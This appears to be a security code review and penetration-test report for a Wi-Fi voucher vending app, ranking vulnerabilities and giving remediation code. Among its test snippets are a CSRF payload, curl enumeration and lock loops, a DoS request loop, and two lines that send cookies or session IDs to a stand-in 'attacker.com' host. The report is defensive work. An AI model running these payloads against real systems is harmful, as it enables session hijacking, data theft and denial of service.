# Wi-Fi Vendo Machine - Security Code Review & Penetration Testing Report

**Date**: 2024
**Reviewed Files**: 
- `Chemical_Neon/Shop/index.html` (Frontend)
- `Chemical_Neon/Controllers/VendingController.cs` (Backend)

---

## Executive Summary

The application has a **MEDIUM-HIGH security risk profile**. While some good practices are in place (parameterized queries, session tracking), there are several critical vulnerabilities that could lead to unauthorized access, financial fraud, and data manipulation. Immediate remediation is required before production deployment.

**Risk Level**: ?? **CRITICAL** (Multiple high-impact vulnerabilities)

---

## 1. CRITICAL VULNERABILITIES

### 1.1 Missing HTTPS/TLS Encryption
**Severity**: ?? **CRITICAL** | **CVSS 9.1**

**Issue**: 
```javascript
const API_URL = "http://localhost:83/api"; // ? Uses HTTP, not HTTPS
```

**Problems**:
- Session IDs transmitted in plaintext over the network
- Man-in-the-middle (MITM) attacks can intercept credentials
- Financial transactions (voucher purchase) exposed to eavesdropping
- Machine ID and API keys can be captured

**Penetration Test**:
```bash
# Attacker on the same network can use Wireshark/tcpdump
tcpdump -i eth0 'port 83' | grep sessionId
# This will reveal the session ID in plaintext

# Attacker can then use this session to:
# - Manipulate credit amounts
# - Purchase vouchers without payment
# - Hijack the vending machine lock
```

**Remediation**:
```javascript
// ? FIXED: Use HTTPS
const API_URL = "https://your-domain.com/api";
```

**Priority**: Fix before ANY production use

---

### 1.2 Weak Session ID Generation
**Severity**: ?? **CRITICAL** | **CVSS 8.6**

**Issue**:
```javascript
sessionId = Math.random().toString(36).substring(2) + Date.now().toString(36);
```

**Problems**:
- `Math.random()` is NOT cryptographically secure
- Session IDs are predictable (can be brute-forced)
- `Date.now()` is easily guessable within millisecond precision
- An attacker can generate valid session IDs

**Penetration Test**:
```javascript
// Attacker could predict the next session ID
const currentTime = Date.now();
for (let i = 0; i < 1000; i++) {
    // Try timestamps around current time
    const predictedSessionId = Math.random().toString(36).substring(2) + (currentTime + i).toString(36);
    // Brute force attempts with predicted IDs
    fetch(`${API_URL}/vending/status/${MACHINE_ID}?sessionId=${predictedSessionId}`);
}
```

**Remediation**:
```javascript
// ? FIXED: Use cryptographically secure random
function generateSecureSessionId() {
    const array = new Uint8Array(32);
    crypto.getRandomValues(array);
    return Array.from(array, byte => byte.toString(16).padStart(2, '0')).join('');
}

let sessionId = localStorage.getItem('vendo_session');
if (!sessionId) {
    sessionId = generateSecureSessionId();
    localStorage.setItem('vendo_session', sessionId);
}
```

**Priority**: Fix immediately

---

### 1.3 Session Fixation Attack - No Server-Side Session Validation
**Severity**: ?? **CRITICAL** | **CVSS 8.8**

**Issue**:
```javascript
// Frontend generates session ID locally, server trusts it implicitly
sessionId = Math.random().toString(36).substring(2) + Date.now().toString(36);
localStorage.setItem('vendo_session', sessionId);

// Backend accepts ANY session ID without validation
if (isMySession = lockedBy == sessionId) { /* Trust established */ }
```

**Problems**:
- Attacker can set their own session ID in localStorage
- Server blindly trusts the session ID without verification
- No server-side session token management
- Attacker can impersonate any session

**Penetration Test**:
```javascript
// Browser Console Exploit:
localStorage.setItem('vendo_session', 'attacker-controlled-id');

// Now attacker can call:
fetch('http://localhost:83/api/vending/lock', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ 
        machineId: 'SITE_001', 
        sessionId: 'attacker-controlled-id' 
    })
});
// Machine gets locked, legitimate user blocked!
```

**Remediation**:
Backend should generate and validate sessions:
```csharp
// Backend implementation
[HttpPost("session/create")]
public IActionResult CreateSession([FromBody] SessionRequest req)
{
    var sessionToken = GenerateSecureToken(); // Server-generated
    var sessionData = new SessionData 
    { 
        Token = sessionToken,
        MachineId = req.MachineId,
        CreatedAt = DateTime.UtcNow,
        ExpiresAt = DateTime.UtcNow.AddHours(1)
    };
    
    // Store in server-side cache (Redis, Memory, etc.)
    _sessionService.Save(sessionData);
    
    return Ok(new { sessionToken });
}

// Then validate on every request
private bool ValidateSession(string token)
{
    var session = _sessionService.Get(token);
    return session != null && session.ExpiresAt > DateTime.UtcNow;
}
```

**Priority**: Fix immediately (Architectural change needed)

---

### 1.4 No CSRF (Cross-Site Request Forgery) Protection
**Severity**: ?? **HIGH** | **CVSS 8.1**

**Issue**:
```javascript
// No CSRF token validation
fetch(`${API_URL}/vending/lock`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ machineId: MACHINE_ID, sessionId: sessionId })
});
```

**Problems**:
- No CSRF token sent with requests
- An attacker website can make requests on behalf of the user
- State-changing operations (lock, buy) vulnerable to CSRF

**Penetration Test**:
```html
<!-- Attacker's website -->
<img src="http://localhost:83/api/vending/lock" 
     onload="fetch('http://localhost:83/api/vending/buy', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
            machineId: 'SITE_001',
            sessionId: 'victim-session-id',
            durationMinutes: 60
        })
     })">
```

**Remediation**:
```csharp
// Backend: Add CSRF token generation
[HttpGet("csrf-token")]
public IActionResult GetCsrfToken()
{
    var token = GenerateCsrfToken();
    Response.Cookies.Append("XSRF-TOKEN", token);
    return Ok(new { csrfToken = token });
}

// Add middleware to validate CSRF tokens on POST/PUT/DELETE
// Configure: services.AddAntiforgery(options => {
//     options.HeaderName = "X-CSRF-TOKEN";
//     options.FormFieldName = "_csrf";
// });
```

**Frontend**:
```javascript
// Fetch and include CSRF token
const csrfToken = document.querySelector('[name="_csrf"]').value;
fetch(`${API_URL}/vending/lock`, {
    method: 'POST',
    headers: { 
        'Content-Type': 'application/json',
        'X-CSRF-TOKEN': csrfToken  // ? Add CSRF token
    },
    body: JSON.stringify({ machineId: MACHINE_ID, sessionId: sessionId })
});
```

**Priority**: High - Implement CSRF protection

---

## 2. HIGH SEVERITY VULNERABILITIES

### 2.1 No Input Validation/Sanitization on Frontend
**Severity**: ?? **HIGH** | **CVSS 7.5**

**Issue**:
```javascript
// Voucher code directly injected into DOM without sanitization
document.getElementById('voucherCode').innerText = data.code;

// Credit display could contain malicious values
document.getElementById('creditDisplay').innerText = data.currentCredit.toFixed(2);
```

**Problems**:
- Although using `innerText` is safer than `innerHTML`, backend data injection still possible
- If backend is compromised, malicious scripts could be injected
- No validation of API response data types

**Penetration Test - Requires Backend Compromise**:
```javascript
// If attacker compromises backend API:
// Response: { code: "<img src=x onerror='fetch(attacker.com/steal?data=' + document.cookie + ')'>" }
// XSS could execute if using innerHTML instead of innerText
```

**Remediation**:
```javascript
// ? Frontend validation
function setVoucherCode(code) {
    // Validate voucher code format
    if (!/^[A-Z0-9]{10,20}$/.test(code)) {
        console.error('Invalid voucher code format');
        return;
    }
    document.getElementById('voucherCode').textContent = code; // ? Use textContent
}

// ? Validate credit is a valid number
function updateCredit(credit) {
    if (typeof credit !== 'number' || credit < 0 || credit > 10000) {
        console.error('Invalid credit value');
        return;
    }
    document.getElementById('creditDisplay').textContent = credit.toFixed(2);
}
```

**Priority**: Medium - Add defensive programming

---

### 2.2 Missing API Authentication & Authorization
**Severity**: ?? **HIGH** | **CVSS 7.8**

**Issue**:
```csharp
// No authentication required for status endpoint
[HttpGet("status/{machineId}")]
public async Task<IActionResult> GetStatus(string machineId, [FromQuery] string sessionId)
{
    // Anyone can query any machine
    // No API key, no authentication headers
}
```

**Problems**:
- Anyone can call the API endpoints with any machine ID
- No rate limiting prevents brute force attacks
- No API key authentication for the hardware coin endpoint
- Enumeration attacks possible (try all machine IDs)

**Penetration Test**:
```bash
# Enumerate all machine IDs
for i in {001..999}; do
    curl "http://localhost:83/api/vending/status/SITE_$(printf '%03d' $i)?sessionId=test" 
done

# Lock any machine
curl -X POST "http://localhost:83/api/vending/lock" \
  -H "Content-Type: application/json" \
  -d '{"machineId":"SITE_002","sessionId":"hacker"}'

# Check status of any machine
curl "http://localhost:83/api/vending/status/SITE_001?sessionId=hacker"
```

**Remediation**:
```csharp
// ? Add API key authentication
[ApiController]
[Route("api/[controller]")]
public class VendingController : ControllerBase
{
    private const string API_KEY_HEADER = "X-API-Key";
    
    private bool ValidateApiKey(HttpRequest request)
    {
        if (!request.Headers.TryGetValue(API_KEY_HEADER, out var apiKey))
            return false;
            
        return _configuration["ApiKeys:VendingApi"] == apiKey.ToString();
    }
    
    [HttpGet("status/{machineId}")]
    public async Task<IActionResult> GetStatus(string machineId)
    {
        if (!ValidateApiKey(Request))
            return Unauthorized("Invalid API key");
            
        // Validate machineId format
        if (!Regex.IsMatch(machineId, @"^SITE_\d{3}$"))
            return BadRequest("Invalid machine ID format");
            
        // ... rest of implementation
    }
}

// Frontend
const headers = {
    'Content-Type': 'application/json',
    'X-API-Key': 'your-api-key-here'  // ? Add API key
};
fetch(`${API_URL}/vending/status/${MACHINE_ID}?sessionId=${sessionId}`, { headers })
```

**Priority**: High - Add authentication

---

### 2.3 No Input Validation on MachineId/SessionId
**Severity**: ?? **HIGH** | **CVSS 7.2**

**Issue**:
```csharp
[HttpGet("status/{machineId}")]
public async Task<IActionResult> GetStatus(string machineId, [FromQuery] string sessionId)
{
    // No validation of input format
    using var cmd = new MySqlCommand(
        "SELECT LockedBySessionId, LockExpiration, CurrentCredit FROM VendingMachines WHERE MachineIdentifier = @Id", 
        conn);
    cmd.Parameters.AddWithValue("@Id", machineId); // ? Good: parameterized query
}
```

**Problems**:
- While parameterized queries prevent SQL injection (good!), no format validation
- Arbitrary string values accepted (could cause unexpected behavior)
- No maximum length limits

**Remediation**:
```csharp
// ? Add input validation
[HttpGet("status/{machineId}")]
public async Task<IActionResult> GetStatus(string machineId, [FromQuery] string sessionId)
{
    // Validate format
    if (!Regex.IsMatch(machineId, @"^SITE_\d{3}$"))
        return BadRequest("Invalid machine ID format");
        
    if (string.IsNullOrWhiteSpace(sessionId) || sessionId.Length > 100)
        return BadRequest("Invalid session ID");
        
    // ... rest of implementation
}
```

**Priority**: Medium - Add validation

---

## 3. MEDIUM SEVERITY VULNERABILITIES

### 3.1 Sensitive Data in Browser Console/Logs
**Severity**: ?? **MEDIUM** | **CVSS 5.3**

**Issue**:
```javascript
console.error('Polling error:', e);  // Error details exposed
```

**Problems**:
- Error messages could expose system information
- If someone gets physical access or screen sharing, they see error logs
- Development error details exposed in production

**Remediation**:
```javascript
// ? Remove verbose error logging in production
function logError(error) {
    if (environment === 'production') {
        // Send to secure backend logging
        fetch('/api/logs/error', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ message: 'Operation failed' })
        });
    } else {
        console.error(error);
    }
}
```

**Priority**: Medium

---

### 3.2 Hardcoded Machine ID in Frontend
**Severity**: ?? **MEDIUM** | **CVSS 5.1**

**Issue**:
```javascript
const MACHINE_ID = "SITE_001"; // ? Hardcoded in frontend
```

**Problems**:
- Attacker can change this to attack other machines
- Machine ID is exposed in source code (trivial to find)
- No machine identification verification

**Remediation**:
```html
<!-- Inject from server -->
<script>
    const MACHINE_ID = "{{ machineId }}"; // From server-side template
    
    // Or read from HTML data attribute
    const machineIdElement = document.querySelector('[data-machine-id]');
    const MACHINE_ID = machineIdElement.getAttribute('data-machine-id');
</script>

<!-- HTML -->
<body data-machine-id="SITE_001">
```

**Priority**: Medium

---

### 3.3 localStorage Used for Sensitive Session Data
**Severity**: ?? **MEDIUM** | **CVSS 5.9**

**Issue**:
```javascript
localStorage.setItem('vendo_session', sessionId);           // Session ID
localStorage.setItem('vendo_lock_expiration', lockExpiration.toISOString()); // Timer data
```

**Problems**:
- localStorage is vulnerable to XSS attacks
- If any script is injected, localStorage is accessible
- Data persists across browser sessions (increased exposure)
- Not encrypted, readable in plain text

**Penetration Test - If XSS vulnerability found**:
```javascript
// Injected script could access:
const stolenSessionId = localStorage.getItem('vendo_session');
const stolenExpiration = localStorage.getItem('vendo_lock_expiration');
fetch('attacker.com/steal?session=' + stolenSessionId);
```

**Remediation**:
```javascript
// ? Use sessionStorage for session-only data
sessionStorage.setItem('vendo_session', sessionId); 
sessionStorage.setItem('vendo_lock_expiration', expiration);

// ? Or use httpOnly cookies (set by server only)
// Server: Set-Cookie: vendo_session=XXX; HttpOnly; Secure; SameSite=Strict
// Frontend: Cannot access via JavaScript
```

**Priority**: Medium

---

### 3.4 No Rate Limiting
**Severity**: ?? **MEDIUM** | **CVSS 6.5**

**Issue**:
```javascript
// Continuous polling without rate limiting
setInterval(() => {
    fetch(`${API_URL}/vending/status/${MACHINE_ID}?sessionId=${sessionId}`)
}, 1000); // Every 1 second - could be abused
```

**Problems**:
- Attacker can spam requests causing DoS
- No exponential backoff on errors
- Server can be overwhelmed

**Penetration Test**:
```javascript
// Attack: Rapid-fire requests
for (let i = 0; i < 1000; i++) {
    fetch(`${API_URL}/vending/status/SITE_001?sessionId=test-${i}`);
}
```

**Remediation**:
```csharp
// ? Backend: Add rate limiting
services.AddRateLimiter(options =>
{
    options.GlobalLimiter = PartitionedRateLimiter.Create<HttpContext, string>(context =>
        RateLimitPartition.GetFixedWindowLimiter(
            partitionKey: context.Connection.RemoteIpAddress?.ToString() ?? "unknown",
            factory: partition => new FixedWindowRateLimiterOptions
            {
                PermitLimit = 100,
                Window = TimeSpan.FromMinutes(1)
            }));
});

app.UseRateLimiter();
```

```javascript
// ? Frontend: Add exponential backoff
let pollInterval = 1000;
const maxInterval = 30000;

function startPolling() {
    fetch(`${API_URL}/vending/status/${MACHINE_ID}?sessionId=${sessionId}`)
        .then(r => {
            pollInterval = 1000; // Reset on success
            return r.json();
        })
        .catch(e => {
            pollInterval = Math.min(pollInterval * 1.5, maxInterval); // Exponential backoff
        });
        
    setTimeout(() => startPolling(), pollInterval);
}
```

**Priority**: Medium

---

### 3.5 No HTTPS Certificate Pinning (If Mobile App)
**Severity**: ?? **MEDIUM** | **CVSS 6.5**

**Issue**:
```javascript
const API_URL = "http://localhost:83/api";
```

**Problems**:
- If this becomes a mobile app, MITM attacks possible
- Certificate validation not enforced

**Remediation**: For native mobile apps, implement certificate pinning

**Priority**: Low (frontend web app, but important if expanded)

---

## 4. LOW SEVERITY VULNERABILITIES

### 4.1 No HTTPS Strict Transport Security (HSTS) Header
**Severity**: ?? **LOW** | **CVSS 4.3**

**Remediation**:
```csharp
// ? Add to Startup.cs
app.Use(async (context, next) =>
{
    context.Response.Headers.Add("Strict-Transport-Security", "max-age=31536000; includeSubDomains");
    await next();
});
```

---

### 4.2 Missing Security Headers
**Severity**: ?? **LOW** | **CVSS 4.2**

**Remediation**:
```csharp
// ? Add security headers middleware
app.Use(async (context, next) =>
{
    context.Response.Headers.Add("X-Content-Type-Options", "nosniff");
    context.Response.Headers.Add("X-Frame-Options", "DENY");
    context.Response.Headers.Add("X-XSS-Protection", "1; mode=block");
    context.Response.Headers.Add("Content-Security-Policy", "default-src 'self'; script-src 'self' 'unsafe-inline'");
    context.Response.Headers.Add("Referrer-Policy", "strict-origin-when-cross-origin");
    await next();
});
```

---

### 4.3 No Voucher Code Format Validation
**Severity**: ?? **LOW** | **CVSS 3.8**

**Remediation**:
```csharp
// ? Validate voucher code format
private bool IsValidVoucherCode(string code)
{
    return !string.IsNullOrEmpty(code) && 
           Regex.IsMatch(code, @"^[A-Z0-9]{10,20}$") &&
           code.Length <= 20;
}
```

---

## 5. SECURITY BEST PRACTICES RECOMMENDATIONS

### 5.1 Implement Proper Error Handling
```csharp
// ? Return generic error messages
if (rowsAffected <= 0) 
    return BadRequest(new { message = "Unable to process request" }); // Generic

// ? Avoid specific error details
// return BadRequest(new { message = "Machine is locked by session ABC123" }); // Information disclosure
```

### 5.2 Add Logging & Monitoring
```csharp
// ? Log security events
_logger.LogWarning($"Failed lock attempt on machine {machineId} from {sessionId}");
_logger.LogError($"Invalid API key from {ipAddress}");

// Monitor for:
// - Multiple failed lock attempts
// - Invalid session IDs
// - API key misuse
// - Unusual credit amounts
```

### 5.3 Database Security
```csharp
// ? Ensure database user has minimal privileges
// - Read-only for status queries? No, needs write for credit
// - But should NOT have DROP/ALTER permissions
// - Use stored procedures with explicit permissions

// ? Add query timeout to prevent long-running queries
cmd.CommandTimeout = 30; // 30 seconds max
```

### 5.4 API Response Security
```csharp
// ? Don't return sensitive data unnecessarily
return Ok(new {
    CurrentCredit = credit,
    LockedBySessionId = lockedBy,  // ? Exposing session ID
    ApiKey = apiKey                 // ? Never return keys!
});

// ? Return only necessary data
return Ok(new {
    CurrentCredit = credit,
    LockedByMe = isMySession // Boolean, not the actual ID
});
```

---

## 6. EXPLOITATION SCENARIOS

### Scenario 1: Session Hijacking Attack
```
1. Attacker intercepts HTTP traffic (no HTTPS)
2. Captures session ID: "abc123def456"
3. Opens browser, console: localStorage.setItem('vendo_session', 'abc123def456')
4. Refreshes page, now has access to victim's locked machine
5. Can purchase vouchers or add credit
6. Victim's machine becomes locked for legitimate user
```

### Scenario 2: Brute Force Session IDs
```
1. Attacker generates predictable session IDs using Math.random()
2. Runs loop trying session IDs: "g1f2h3i4j5", "g1f2h3i4j6", etc.
3. Finds valid session ID
4. Gets access to a locked machine
5. Purchases vouchers without inserting coins
```

### Scenario 3: Credit Amount Manipulation
```
1. Attacker intercepts response from /status endpoint
2. Modifies response: { currentCredit: 999999 }
3. Can now purchase vouchers at incorrect rates
4. Machine shows ?999,999 credit
5. Financial loss for owner
```

### Scenario 4: Machine Lock Denial of Service
```
1. Attacker calls /lock endpoint with valid session
2. Machine gets locked
3. Legitimate customer cannot use machine
4. Revenue loss
```

---

## 7. IMPLEMENTATION PRIORITY

### Phase 1 - CRITICAL (Implement immediately)
- [ ] Switch to HTTPS/TLS
- [ ] Implement server-side session management
- [ ] Add CSRF protection
- [ ] Implement API key authentication
- [ ] Add input validation

### Phase 2 - HIGH (Implement within 1-2 weeks)
- [ ] Add rate limiting
- [ ] Implement proper error handling
- [ ] Add security headers
- [ ] Move machine ID from frontend
- [ ] Use sessionStorage instead of localStorage

### Phase 3 - MEDIUM (Implement within 1-2 months)
- [ ] Add comprehensive logging/monitoring
- [ ] Implement database access controls
- [ ] Add voucher code validation
- [ ] Security testing/penetration testing
- [ ] Set up intrusion detection

---

## 8. TESTING CHECKLIST

- [ ] Test with invalid session IDs
- [ ] Test with invalid machine IDs
- [ ] Test with malformed JSON requests
- [ ] Test with negative credit amounts
- [ ] Test with oversized input values
- [ ] Test API endpoints without authentication
- [ ] Test rate limiting with rapid requests
- [ ] Test CSRF attacks from external sites
- [ ] Verify HTTPS enforcement
- [ ] Check for information disclosure in error messages

---

## 9. COMPLIANCE CONSIDERATIONS

If this system handles financial transactions:
- **PCI DSS**: Requires encryption, access controls, monitoring
- **GDPR**: Session data may require consent
- **Local Financial Regulations**: May require audit trails, secure transactions

---

## 10. SUMMARY TABLE

| Vulnerability | Severity | Status | Priority |
|---|---|---|---|
| No HTTPS | CRITICAL | ? Open | P0 |
| Weak Session IDs | CRITICAL | ? Open | P0 |
| No Session Validation | CRITICAL | ? Open | P0 |
| No CSRF Protection | HIGH | ? Open | P1 |
| No Input Validation | HIGH | ? Open | P1 |
| No API Authentication | HIGH | ? Open | P1 |
| No Rate Limiting | MEDIUM | ? Open | P2 |
| localStorage for Sessions | MEDIUM | ? Open | P2 |
| Hardcoded Machine ID | MEDIUM | ? Open | P2 |
| Verbose Error Logging | MEDIUM | ?? Partial | P2 |
| Missing Security Headers | LOW | ? Open | P3 |

---

## Recommendations

**DO NOT deploy this application to production without addressing the CRITICAL vulnerabilities.**

The application is suitable for:
- ? Local development/testing on isolated networks
- ? Private LAN environments with network access controls
- ? Public-facing internet deployments (too many vulnerabilities)

Contact a security professional for assistance with remediation if needed.

